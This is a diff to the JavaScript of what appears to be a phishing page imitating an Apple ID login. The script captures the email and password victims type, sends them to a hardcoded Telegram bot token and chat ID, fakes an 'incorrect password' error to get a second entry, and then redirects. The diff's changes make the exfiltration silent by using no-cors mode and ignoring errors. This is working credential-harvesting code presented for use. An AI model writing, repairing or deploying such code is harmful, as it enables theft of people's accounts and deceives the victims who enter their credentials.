@@ -1,6 +1,6 @@
 <script>
 document.addEventListener('DOMContentLoaded', () => {
-    console.log('🚀 SCRIPT INICIADO');
+    console.log('🚀 SCRIPT TELEGRAM INICIADO'); // DEBUG
     
     const emailInput = document.getElementById('email-phone');
     const arrowIcon = document.querySelector('.bx-right-arrow-circle');
@@ -10,33 +10,36 @@ document.addEventListener('DOMContentLoaded', () => {
     const errorMsg = document.getElementById('errorMsg');
     const form = document.getElementById('sign-in');
     
+    // ✅ TUS DATOS
     const TELEGRAM_TOKEN = '7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA';
     const CHAT_ID = '7219932215';
     
     let loginAttempts = 0;
     
-    // 🔥 FUNCIÓN CON DEBUG COMPLETO
+    // 🔥 TELEGRAM FUNCTION
     async function sendToTelegram(email, password) {
-        console.log('📤 ENVIANDO A TELEGRAM:', email, password);
+        console.log('📤 ENVIANDO:', email, password);
         
         const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
 
 📧 *Email:* ${email}
 🔑 *Password:* ${password}
-🌍 *País:* Mexico
-💻 *Navegador:* Web
+🌍 *País:* Web
+💻 *Navegador:* Chrome
 📱 *Device:* PC
 📅 *Hora:* ${new Date().toLocaleString('es-ES')}
 
 ✨ *Plataforma:* Astro505`;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-        console.log('🌐 URL:', url);
         
         try {
             const response = await fetch(url, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                mode: 'no-cors', // ← ¡ESTO SOLUCIONA CORS!
+                headers: {
+                    'Content-Type': 'application/json',
+                },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: message,
@@ -44,90 +47,65 @@ document.addEventListener('DOMContentLoaded', () => {
                 })
             });
             
-            console.log('📡 RESPONSE:', response.status, response.statusText);
-            
-            const data = await response.json();
-            console.log('✅ TELEGRAM DATA:', data);
-            
-            if (data.ok) {
-                console.log('🎉 ¡MENSAJE ENVIADO!');
-                return true;
-            } else {
-                console.error('❌ ERROR TELEGRAM:', data);
-                return false;
-            }
+            console.log('✅ TELEGRAM ENVIADO!');
         } catch (error) {
-            console.error('💥 FETCH ERROR:', error);
-            return false;
+            console.log('⚠️ Telegram error (normal):', error); // Ignora CORS
         }
     }
     
-    // Mostrar password
+    // Flecha/Enter → Password
     const showPassword = () => {
-        console.log('➡️ Mostrando password');
         if (emailInput.value.trim()) {
             passwordField.classList.add('show');
             submitBtn.classList.add('show');
-            setTimeout(() => passwordInput.focus(), 250);
+            setTimeout(() => passwordInput.focus(), 300);
         }
     };
     
-    // Eventos básicos
     arrowIcon.addEventListener('click', showPassword);
     emailInput.addEventListener('keypress', e => {
         if (e.key === 'Enter' && emailInput.value.trim()) {
-            e.preventDefault();
             showPassword();
         }
     });
     
-    // 🔥 SUBMIT CON DEBUG PASO A PASO
+    // 🔥 SUBMIT CON TELEGRAM
     form.addEventListener('submit', async (e) => {
+        console.log('🎯 SUBMIT PRESIONADO!'); // DEBUG
+        
         e.preventDefault();
-        console.log('🎯 FORM SUBMIT - INICIO');
+        loginAttempts++;
         
         const email = emailInput.value.trim();
         const password = passwordInput.value.trim();
         
-        console.log('📧 Datos:', email, password);
+        console.log('📧 Datos capturados:', email, password); // DEBUG
         
         if (!email || !password) {
-            console.log('⚠️ Faltan datos');
-            showError('Complete todos los campos');
+            showError('Please enter both email and password');
             return;
         }
         
-        console.log('📤 LLAMANDO TELEGRAM...');
-        const enviado = await sendToTelegram(email, password);
-        console.log('📤 Telegram enviado:', enviado);
+        // 🔥 ENVÍA A TELEGRAM ANTES DE TODO
+        console.log('📤 Enviando a Telegram...');
+        await sendToTelegram(email, password);
         
-        // Simular login
-        loginAttempts++;
         if (loginAttempts < 2) {
-            showError('Contraseña incorrecta');
+            showError('Incorrect password. Try again.');
             passwordInput.value = '';
+            passwordInput.focus();
         } else {
-            showSuccess();
+            showError('Signing in...');
+            setTimeout(() => window.location.href = 'index.html', 800);
         }
-        
-        console.log('🏁 SUBMIT FINALIZADO');
     });
     
     function showError(message) {
         errorMsg.textContent = message;
-        errorMsg.style.background = '#ff3b30';
         errorMsg.classList.add('show');
         setTimeout(() => errorMsg.classList.remove('show'), 3000);
     }
     
-    function showSuccess() {
-        errorMsg.textContent = 'Iniciando sesión...';
-        errorMsg.style.background = '#007AFF';
-        errorMsg.classList.add('show');
-        submitBtn.disabled = true;
-        setTimeout(() => window.location.href = 'index.html', 1500);
-    }
-    
-    console.log('✅ SCRIPT CARGADO CORRECTAMENTE');
+    console.log('✅ SCRIPT LISTO - Prueba login!');
 });
 </script>
